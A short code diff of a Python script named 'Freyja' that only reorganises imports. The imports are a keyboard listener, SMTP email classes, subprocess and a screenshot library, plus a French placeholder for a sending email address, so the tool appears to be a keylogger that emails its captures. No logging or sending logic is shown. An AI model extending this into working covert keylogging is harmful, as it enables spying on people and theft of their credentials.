@@ -1,24 +1,12 @@
 # Freyja v1.1.2.3
 
 from pynput.keyboard import Key, Listener
-import logging
-import smtplib
+import logging, smtplib, os, socket, datetime, sys, subprocess, time, simplejson, re, platform, shutil, pyscreeze
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-import os
-import socket
-import datetime
-import sys
 from subprocess import Popen, PIPE, check_output
-import subprocess
-import time
-import simplejson
-import re
-import platform
-import shutil
-import pyscreeze
 
 # Données à modifier
 configuser = "L'email pour envoyer"
